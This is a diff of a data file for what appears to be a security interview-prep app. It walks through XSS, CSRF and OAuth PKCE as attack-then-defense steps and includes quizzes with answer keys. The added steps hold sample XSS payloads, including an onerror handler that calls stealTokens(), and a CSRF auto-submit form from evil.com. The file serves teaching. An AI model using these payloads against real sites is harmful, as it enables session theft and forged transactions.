+          "method": "GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Content-Type: text/html; charset=utf-8",
+            "Host: app.com"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Database / URL Reflection validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "<div>You searched for: <script>alert(document.domain)</script></div>",
+          "securityAction": "Template engine reflects raw query string directly into rendered HTML markup.",
+          "statusBadge": "REFLECTED IN DOM"
         }
       },
       {
         "id": 3,
-        "label": "Safe Sink Assignment",
-        "from": "dom_sink",
-        "to": "secure_encoding",
-        "packet": "element.textContent = input (Safe Text Context)",
-        "caption": "Step 3: Defense: Use safe DOM APIs (textContent, createElement) and context-aware output encoding to treat data strictly as text.",
-        "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Safe Sink Assignment",
-        "whatIsHappeningText": "Step 3: Defense: Use safe DOM APIs (textContent, createElement) and context-aware output encoding to treat data strictly as text.",
+        "label": "DOM-Based XSS (Pure Client-Side Sinks)",
+        "from": "victim",
+        "to": "dom",
+        "packet": "Client JS: location.hash -> document.getElementById('output').innerHTML = hash",
+        "caption": "Step 3: DOM XSS: Server is never even contacted; client-side JavaScript reads from an unvalidated source (hash) and writes to an unsafe sink (innerHTML).",
+        "status": "attack",
+        "whatIsHappeningTitle": "Step 3: DOM-Based XSS",
+        "whatIsHappeningText": "Step 3: DOM-Based XSS: Server is never even contacted; client-side JavaScript reads from an unvalidated source (hash) and writes to an unsafe sink (innerHTML).",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "DOM XSS",
+            "definition": "XSS where the attack payload is processed entirely on the client by insecure JavaScript modifying the DOM environment."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Source vs Sink",
+            "definition": "Sources are JavaScript properties reading user input (location.hash, search); Sinks are functions executing markup (innerHTML, eval)."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "Unlike Stored and Reflected XSS, DOM XSS occurs entirely within the client-side JavaScript execution environment without the payload traversing the web server. When client JS executes 'element.innerHTML = location.hash.substring(1)', any payload in the URL fragment (#<img src=x onerror=alert(1)>) is parsed directly as HTML by the browser.",
+        "whyItMatters": "Bypasses server-side Web Application Firewalls (WAFs) because URL fragments (#) are never transmitted in HTTP request lines.",
+        "securityVerdict": "Client-side execution sink transforms untrusted input into active JavaScript.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "Browser DOM Processing",
+          "method": "element.innerHTML = location.hash",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Source: window.location.hash",
+            "Sink: Element.innerHTML"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Dangerous Sink\" }",
-          "securityAction": "Backend service Dangerous Sink enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "URL: https://spa.com/dashboard#<img src=x onerror=stealTokens()>",
+          "securityAction": "Client-side routing script injects fragment into DOM; browser executes onerror handler.",
+          "statusBadge": "DOM SINK TRIGGERED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "secure_encoding",
-        "to": "secure_encoding",
-        "packet": "CSP: script-src 'nonce-xyz' (Blocks Unsigned Scripts)",
-        "caption": "Step 4: Interview line: \"Prevent XSS by using modern frameworks with automatic contextual encoding, sanitizing rich HTML with DOMPurify, avoiding dangerous sinks like innerHTML, and enforcing strict Content Security Policies with nonces.\"",
+        "from": "server",
+        "to": "victim",
+        "packet": "Defense: Contextual Encoding + Safe APIs (textContent) + Strict CSP Nonces + Trusted Types",
+        "caption": "Step 4: Interview line: \"Defending against XSS requires a multi-layered approach: contextual output encoding, safe DOM APIs (textContent instead of innerHTML), strict Content Security Policy with nonces, and W3C Trusted Types.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"Prevent XSS by using modern frameworks with automatic contextual encoding, sanitizing rich HTML with DOMPurify, avoiding dangerous sinks like innerHTML, and enforcing strict Content Security Policies with nonces.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"Defending against XSS requires a multi-layered approach: contextual output encoding, safe DOM APIs (textContent instead of innerHTML), strict Content Security Policy with nonces, and W3C Trusted Types.\"",
         "terms": [
           {
-            "term": "Contextual Encoding",
-            "definition": "Encoding input specifically for HTML body, attribute, JS, or URL context."
+            "term": "Contextual Output Encoding",
+            "definition": "Converting dangerous characters into safe entity representations depending on context (HTML body, attribute, JS variable, CSS)."
+          },
+          {
+            "term": "W3C Trusted Types",
+            "definition": "Modern browser standard locking down dangerous DOM sinks (innerHTML) to only accept sanitized, cryptographically certified policy objects."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior candidates articulate the full defense hierarchy: 1) Contextual encoding (e.g. converting < to &lt; in HTML body, but using JSON.stringify for script contexts); 2) Using safe DOM sinks like element.textContent or element.setAttribute rather than innerHTML; 3) Content Security Policy (CSP) with random script nonces; and 4) Enforcing W3C Trusted Types to catch unsafe DOM assignments at runtime.",
+        "whyItMatters": "Provides mathematical resilience against all three XSS variants across complex frontend codebases.",
+        "securityVerdict": "Definitive defense-in-depth: contextual escaping, safe sinks, CSP nonces, and Trusted Types.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "W3C Trusted Types & CSP Level 3",
+          "method": "Enforced Security Policy",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Content-Security-Policy: require-trusted-types-for 'script'; script-src 'nonce-d98a2f' 'strict-dynamic'",
+            "X-Content-Type-Options: nosniff"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Output encoding is context-dependent: encoding for HTML body (&lt;) do...\" }",
-          "securityAction": "Final defensive control verified: Context Encoding + CSP secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "DOM assignment intercepted by Trusted Types: \"TypeError: Failed to set 'innerHTML': This document requires 'TrustedHTML' assignment.\"",
+          "securityAction": "Browser blocks arbitrary innerHTML injection; forces usage of DOMPurify sanitized policy.",
+          "statusBadge": "TRUSTED TYPES ENFORCED"
         }
       }
     ],
@@ -3701,15 +3746,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Advanced",
     "interviewTakeaway": "Output encoding is context-dependent: encoding for HTML body (&lt;) does not prevent injection inside HTML attributes, href URLs, or <script> tags. Use DOMPurify for rich text and CSP as defense-in-depth.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What are the differences between Stored, Reflected, and DOM XSS, and how is XSS prevented?\"?",
+      "question": "Why can Server-Side Web Application Firewalls (WAFs) fail to detect or block DOM-Based XSS attacks?",
       "options": [
-        "CSP: script-src 'nonce-xyz' (Blocks Unsigned Scripts)",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Because DOM XSS payloads can reside in the URL fragment identifier (after the '#' symbol), which browsers never transmit over the network to the server in HTTP requests",
+        "Because DOM XSS attacks only execute on Linux operating systems",
+        "Because DOM XSS payloads are automatically encrypted by the operating system kernel",
+        "Because WAFs are legally prohibited from inspecting JavaScript payloads under RFC 9110"
       ],
       "correctIndex": 0,
-      "explanation": "Output encoding is context-dependent: encoding for HTML body (&lt;) does not prevent injection inside HTML attributes, href URLs, or <script> tags. Use DOMPurify for rich text and CSP as defense-in-depth."
+      "explanation": "HTTP specifications mandate that URL fragments (everything after the '#' character) remain strictly client-side; browsers never transmit them to the server. If client-side JavaScript reads from location.hash and writes to an unsafe sink like innerHTML, the attack executes without the server or WAF ever seeing the payload."
     }
   },
   {
@@ -3747,136 +3792,147 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Cross-Site Form Triggered",
-        "from": "malicious_site",
-        "to": "victim_browser",
-        "packet": "POST https://bank.com/transfer?to=evil&amount=5000",
-        "caption": "Step 1: Victim visits evil.com while logged into their bank. Malicious site automatically submits a hidden form targeting bank.com.",
+        "label": "Attacker Malicious Auto-Submit Form",
+        "from": "attacker",
+        "to": "victim",
+        "packet": "HTML Payload: <form action='https://bank.com/transfer' method='POST'><input name='amount' value='5000'>",
+        "caption": "Step 1: Attacker hosts an auto-submitting hidden HTML form on evil.com targeting the victim's banking application.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: Cross-Site Form Triggered",
-        "whatIsHappeningText": "Step 1: Victim visits evil.com while logged into their bank. Malicious site automatically submits a hidden form targeting bank.com.",
+        "whatIsHappeningTitle": "Step 1: Malicious Auto-Submit Form",
+        "whatIsHappeningText": "Step 1: Attacker hosts an auto-submitting hidden HTML form on evil.com targeting the victim's banking application.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "CSRF (Cross-Site Request Forgery)",
+            "definition": "An attack that forces an authenticated user's browser to execute unwanted actions on a vulnerable web application."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "Ambient Credentials",
+            "definition": "Cookies and HTTP authentication headers that browsers automatically attach to outgoing requests matching domain boundaries."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "The victim has an active session cookie on bank.com. When the victim visits evil.com, an invisible JavaScript script executes: document.forms[0].submit(). The browser issues an HTTP POST to bank.com/transfer. Because browsers historically attached all matching domain cookies automatically, the server receives legitimate credentials.",
+        "whyItMatters": "Allows attackers to transfer money, change passwords, or modify email addresses without knowing the victim's password.",
+        "securityVerdict": "Ambient credential dispatch enables unauthorized cross-origin state changes.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/1.1 Cross-Origin Form POST",
+          "method": "POST /transfer",
           "headers": [
-            "Host: api.cross.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Host: bank.com",
+            "Referer: https://evil.com",
+            "Cookie: session_id=s_984128 (Attached automatically by browser)"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Victim Browser\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Victim Browser.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "recipient=attacker&amount=5000",
+          "securityAction": "Vulnerable server checks session cookie, sees valid session for victim, and executes transfer.",
+          "statusBadge": "CSRF EXPLOITED"
         }
       },
       {
         "id": 2,
-        "label": "Ambient Cookie Auto-Attached",
-        "from": "victim_browser",
-        "to": "bank_server",
-        "packet": "Cookie: session=alice_valid_cookie (Auto-Attached by Browser)",
-        "caption": "Step 2: Without protection, the browser automatically attaches the stored bank session cookie to cross-origin requests.",
-        "status": "attack",
-        "whatIsHappeningTitle": "Step 2: Ambient Cookie Auto-Attached",
-        "whatIsHappeningText": "Step 2: Without protection, the browser automatically attaches the stored bank session cookie to cross-origin requests.",
+        "label": "SameSite=Lax Cookie Suppression",
+        "from": "victim",
+        "to": "server",
+        "packet": "Cross-site POST blocked: Cookie withheld by browser due to SameSite=Lax",
+        "caption": "Step 2: SameSite=Lax defense: The browser withholds the session cookie on cross-site POST requests, neutralizing standard form CSRF.",
+        "status": "defense",
+        "whatIsHappeningTitle": "Step 2: SameSite=Lax Cookie Suppression",
+        "whatIsHappeningText": "Step 2: SameSite=Lax defense: The browser withholds the session cookie on cross-site POST requests, neutralizing standard form CSRF.",
         "terms": [
           {
-            "term": "Ambient Credentials",
-            "definition": "Cookies and basic auth automatically attached by the browser on cross-origin requests."
+            "term": "SameSite=Lax",
+            "definition": "Browser cookie attribute withholding cookies on cross-site subrequests (POST, iframe, script) while sending them on top-level GET navigations."
+          },
+          {
+            "term": "Top-Level Navigation",
+            "definition": "A user clicking a link that changes the entire browser address bar (GET request)."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "Modern browsers enforce SameSite=Lax by default. When evil.com initiates a cross-site POST request to bank.com, the browser inspects the cookie jar and notes the request is cross-site. It withholds the session cookie. The request arrives at bank.com completely unauthenticated (anonymous), and is rejected with 401 Unauthorized.",
+        "whyItMatters": "Provides native browser-level defense against the most common form-based CSRF attack vectors.",
+        "securityVerdict": "Browser-enforced credential suppression halts cross-site state mutation.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "RFC 6265bis SameSite Evaluation",
+          "method": "POST /transfer",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Host: bank.com",
+            "Sec-Fetch-Site: cross-site",
+            "Sec-Fetch-Mode: navigate",
+            "Cookie: [WITHHELD BY BROWSER ENGINE]"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Victim Browser validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "Request arrives without session credentials.",
+          "securityAction": "Bank server fails authentication check; rejects transfer attempt with 401 Unauthorized.",
+          "statusBadge": "COOKIE WITHHELD"
         }
       },
       {
         "id": 3,
-        "label": "Anti-CSRF Token Validation",
-        "from": "victim_browser",
-        "to": "csrf_shield",
-        "packet": "Missing X-CSRF-Token / SameSite=Lax blocks cookie",
-        "caption": "Step 3: Defense: The bank requires a cryptographically random, unpredictable anti-CSRF token in request headers that evil.com cannot read due to SOP.",
+        "label": "Synchronizer Anti-CSRF Token Validation",
+        "from": "server",
+        "to": "client",
+        "packet": "X-CSRF-Token: 9b8a1f... (Validated cryptographically against session)",
+        "caption": "Step 3: Synchronizer Token Pattern: Server issues a cryptographically random, per-session anti-CSRF token validated on mutating requests.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Anti-CSRF Token Validation",
-        "whatIsHappeningText": "Step 3: Defense: The bank requires a cryptographically random, unpredictable anti-CSRF token in request headers that evil.com cannot read due to SOP.",
+        "whatIsHappeningTitle": "Step 3: Synchronizer Token Validation",
+        "whatIsHappeningText": "Step 3: Synchronizer Token Validation: Server issues a cryptographically random, per-session anti-CSRF token validated on mutating requests.",
         "terms": [
           {
-            "term": "Synchronizer Token",
-            "definition": "Cryptographically random token required in form/header payload to validate origin."
+            "term": "Synchronizer Token Pattern",
+            "definition": "Generating a high-entropy secret token on the server, embedding it in forms/headers, and verifying it upon submission."
+          },
+          {
+            "term": "Same-Origin Protection (SOP)",
+            "definition": "SOP prevents evil.com from reading the victim's anti-CSRF token from the banking page via JavaScript."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "While SameSite=Lax is powerful, defense-in-depth requires explicit CSRF tokens (to protect against SameSite bypasses, legacy browsers, or top-level GET mutations). The server generates an unpredictable token (HMAC or random 128-bit string) stored in the user's session. Mutating requests must supply this token in a header or form field. Because evil.com cannot read the token due to SOP, it cannot forge it.",
+        "whyItMatters": "Guarantees protection across all browser versions and cross-origin fetch configurations.",
+        "securityVerdict": "Cryptographic token verification proves request originated from authentic application UI.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "Anti-CSRF Verification Pipeline",
+          "method": "POST /api/v1/transfer",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "X-CSRF-Token: a98f12c4e9bd78a2",
+            "Cookie: session_id=s_984128; HttpOnly; Secure"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Target Bank Server\" }",
-          "securityAction": "Backend service Target Bank Server enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Server compares header X-CSRF-Token with session.csrfSecret: Match verified.",
+          "securityAction": "Middleware validates token integrity; permits financial transfer execution.",
+          "statusBadge": "CSRF TOKEN VALID"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "csrf_shield",
-        "to": "bank_server",
-        "packet": "Validation Failed: 403 Forbidden",
-        "caption": "Step 4: Interview line: \"CSRF exploits the browser's automatic attachment of ambient cookies — defeat it using SameSite=Lax/Strict cookie flags, the Synchronizer Token pattern, and custom request headers like X-Requested-With.\"",
+        "from": "server",
+        "to": "client",
+        "packet": "Complete Defense: SameSite=Lax/Strict Cookies + Custom Headers (X-Requested-With) + CSRF Tokens",
+        "caption": "Step 4: Interview line: \"Defending against CSRF requires defense-in-depth: enforce SameSite=Lax/Strict cookies, require custom headers (e.g. X-Requested-With) that cross-origin HTML forms cannot forge, and implement Synchronizer CSRF Tokens on state mutations.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"CSRF exploits the browser's automatic attachment of ambient cookies — defeat it using SameSite=Lax/Strict cookie flags, the Synchronizer Token pattern, and custom request headers like X-Requested-With.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"Defending against CSRF requires defense-in-depth: enforce SameSite=Lax/Strict cookies, require custom headers (e.g. X-Requested-With) that cross-origin HTML forms cannot forge, and implement Synchronizer CSRF Tokens on state mutations.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Custom Header Defense",
+            "definition": "Requiring non-standard headers (e.g. X-CSRF-Token) for API requests, triggering preflight checks if attempted cross-origin."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "Double Submit Cookie Pattern",
+            "definition": "A stateless CSRF defense where a pseudo-random value is sent both in a cookie and in a request header/body."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior candidates present the layered anti-CSRF architecture: 1) SameSite=Lax on all session cookies as the baseline; 2) Synchronizer Token Pattern or Double Submit Cookie pattern on all state-mutating POST/PUT/DELETE routes; 3) Requiring custom headers (e.g. X-Requested-With) for JSON APIs, which browsers refuse to send cross-origin without CORS preflight approval; and 4) Strict verification of Sec-Fetch-Site and Origin headers.",
+        "whyItMatters": "Provides bulletproof defense against ambient credential exploitation across both web and API services.",
+        "securityVerdict": "Comprehensive anti-CSRF framework verified against OWASP standards.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "OWASP CSRF Defense Standard",
+          "method": "Defensive Multi-Layer Architecture",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Cookie: SameSite=Lax; Secure; HttpOnly",
+            "Sec-Fetch-Site: same-origin",
+            "X-CSRF-Token: Verified"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"For traditional multi-page web applications with forms, use the Synchr...\" }",
-          "securityAction": "Final defensive control verified: Anti-CSRF Validator secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "All three defense layers active: SameSite, Custom Headers, and Synchronizer Token matched.",
+          "securityAction": "Transaction processed securely; zero ambient forgery vulnerability.",
+          "statusBadge": "CSRF DEFENDED"
         }
       }
     ],
@@ -3914,15 +3970,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Advanced",
     "interviewTakeaway": "For traditional multi-page web applications with forms, use the Synchronizer Token Pattern. For modern SPAs, use SameSite=Lax cookies paired with custom JSON request headers.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"How does Cross-Site Request Forgery (CSRF) work and what are the definitive modern defenses?\"?",
+      "question": "Why does requiring a custom HTTP request header (such as 'X-CSRF-Token' or 'X-Requested-With') effectively protect REST APIs against Cross-Site Request Forgery (CSRF)?",
       "options": [
-        "Validation Failed: 403 Forbidden",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Because standard HTML forms and simple cross-origin requests cannot attach custom headers; attempting to send them requires a CORS preflight (OPTIONS) check that the server can reject",
+        "Because custom headers automatically encrypt the HTTP body with RSA-4096",
+        "Because custom headers instruct web browsers to delete all cookies before sending the request",
+        "Because custom headers can only be sent from verified Apple or Google hardware devices"
       ],
       "correctIndex": 0,
-      "explanation": "For traditional multi-page web applications with forms, use the Synchronizer Token Pattern. For modern SPAs, use SameSite=Lax cookies paired with custom JSON request headers."
+      "explanation": "Under the CORS specification, standard HTML tags (forms, links, images) can only send simple headers (like Content-Type: application/x-www-form-urlencoded). Sending a custom header like 'X-CSRF-Token' turns the request into a preflighted request, requiring an OPTIONS check that an attacker on another domain cannot bypass without server CORS permission."
     }
   },
   {
@@ -3960,136 +4016,142 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "PKCE Code Challenge Sent",
-        "from": "spa_client",
-        "to": "auth_server",
-        "packet": "GET /authorize?response_type=code&code_challenge=BASE64(SHA256(verifier))",
-        "caption": "Step 1: Public client generates a random cryptographic Code Verifier, computes its SHA-256 hash (Code Challenge), and sends the challenge in the authorize request.",
+        "label": "Client Generates PKCE Verifier & Challenge",
+        "from": "client",
+        "to": "client",
+        "packet": "code_verifier (high-entropy random) -> code_challenge = BASE64URL(SHA256(code_verifier))",
+        "caption": "Step 1: Public client (SPA/Mobile) creates a high-entropy secret (code_verifier) and calculates its SHA-256 hash (code_challenge).",
         "status": "normal",
-        "whatIsHappeningTitle": "Step 1: PKCE Code Challenge Sent",
-        "whatIsHappeningText": "Step 1: Public client generates a random cryptographic Code Verifier, computes its SHA-256 hash (Code Challenge), and sends the challenge in the authorize request.",
+        "whatIsHappeningTitle": "Step 1: Client Generates PKCE Pair",
+        "whatIsHappeningText": "Step 1: Public client (SPA/Mobile) creates a high-entropy secret (code_verifier) and calculates its SHA-256 hash (code_challenge).",
         "terms": [
           {
-            "term": "Code Verifier",
-            "definition": "High-entropy cryptographic random secret string generated by the client."
+            "term": "PKCE (RFC 7636)",
+            "definition": "Proof Key for Code Exchange: An OAuth 2.0 extension protecting public clients from authorization code interception attacks."
+          },
+          {
+            "term": "code_verifier vs code_challenge",
+            "definition": "The code_verifier is the high-entropy unhashed secret (43-128 chars); code_challenge is its SHA-256 Base64URL-encoded fingerprint."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "Public clients (SPAs and native mobile apps) cannot safely store a client_secret because user code can be decompiled or inspected in the browser. RFC 7636 solves this: the client generates a cryptographically random string (code_verifier, 43-128 characters) and hashes it with SHA-256 (code_challenge). The verifier is retained securely in local client memory.",
+        "whyItMatters": "Eliminates the need for embedded client secrets while preventing authorization code theft.",
+        "securityVerdict": "Cryptographic commitment pair generated; verifier retained in memory.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "RFC 7636 Cryptographic Primitive",
+          "method": "Web Crypto API (SubtleCrypto)",
           "headers": [
-            "Host: api.oauth.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "code_challenge_method: S256",
+            "Entropy: 128 bytes CSPRNG"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"OAuth 2.0 Auth Server\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to OAuth 2.0 Auth Server.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "code_verifier: dBjftJeZ4CVP-mB92K... | code_challenge: E9Melhoa2OwvFrEMTJ...",
+          "securityAction": "Client hashes verifier using SHA-256; prepares authorization URL with code_challenge.",
+          "statusBadge": "PKCE PAIR READY"
         }
       },
       {
         "id": 2,
-        "label": "Auth Code Intercepted",
-        "from": "auth_server",
-        "to": "interceptor",
-        "packet": "Redirect: myapp://callback?code=AUTH_CODE_123",
-        "caption": "Step 2: Threat: On mobile or browser redirects, an unauthorized app or browser extension intercepts the authorization code.",
-        "status": "attack",
-        "whatIsHappeningTitle": "Step 2: Auth Code Intercepted",
-        "whatIsHappeningText": "Step 2: Threat: On mobile or browser redirects, an unauthorized app or browser extension intercepts the authorization code.",
+        "label": "Authorization Request with code_challenge",
+        "from": "client",
+        "to": "auth_server",
+        "packet": "GET /authorize?response_type=code&code_challenge=E9M...&code_challenge_method=S256",
+        "caption": "Step 2: Client redirects user to Auth Server sending the code_challenge. The Auth Server authenticates user and records the challenge.",
+        "status": "normal",
+        "whatIsHappeningTitle": "Step 2: Authorization Request with Challenge",
+        "whatIsHappeningText": "Step 2: Client redirects user to Auth Server sending the code_challenge. The Auth Server authenticates user and records the challenge.",
         "terms": [
           {
-            "term": "Code Challenge",
-            "definition": "SHA-256 hash of the Code Verifier sent during initial authorization request."
+            "term": "Authorization Code",
+            "definition": "A short-lived, single-use credential issued by the authorization server via a front-channel redirect."
+          },
+          {
+            "term": "Front-Channel Redirect",
+            "definition": "Communication passing through the user's browser URL bar, where authorization codes can potentially be intercepted by malicious apps."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "The client opens the browser to the authorization server's /authorize endpoint, passing response_type=code, client_id, redirect_uri, scope, and code_challenge. The user logs in and consents. The auth server stores the code_challenge alongside the issued authorization code and redirects back to the client application.",
+        "whyItMatters": "The auth server binds the issued code to the client's cryptographic challenge fingerprint.",
+        "securityVerdict": "Authorization code bound to the client's public challenge parameter.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "OAuth 2.0 / RFC 6749 + RFC 7636",
+          "method": "GET /oauth/v2/authorize",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Host: auth.provider.com",
+            "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS...)"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy OAuth 2.0 Auth Server validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "?response_type=code&client_id=my_spa&code_challenge=E9M...&code_challenge_method=S256",
+          "securityAction": "Auth server stores code_challenge bound to temporary authorization code auth_code_98214.",
+          "statusBadge": "CHALLENGE BOUND"
         }
       },
       {
         "id": 3,
-        "label": "Attacker Token Exchange Fails",
-        "from": "interceptor",
-        "to": "token_endpoint",
-        "packet": "POST /token (Missing Code Verifier secret!)",
-        "caption": "Step 3: Attacker attempts to exchange the stolen authorization code for an Access Token, but is rejected because they do not possess the original unhashed Code Verifier.",
-        "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Attacker Token Exchange Fails",
-        "whatIsHappeningText": "Step 3: Attacker attempts to exchange the stolen authorization code for an Access Token, but is rejected because they do not possess the original unhashed Code Verifier.",
+        "label": "Attacker Code Interception Attempt",
+        "from": "auth_server",
+        "to": "attacker",
+        "packet": "Attacker intercepts authorization code: auth_code_98214 via custom URL scheme",
+        "caption": "Step 3: On mobile devices, a rogue app might intercept the custom URI redirect (myapp://callback?code=123), stealing the code.",
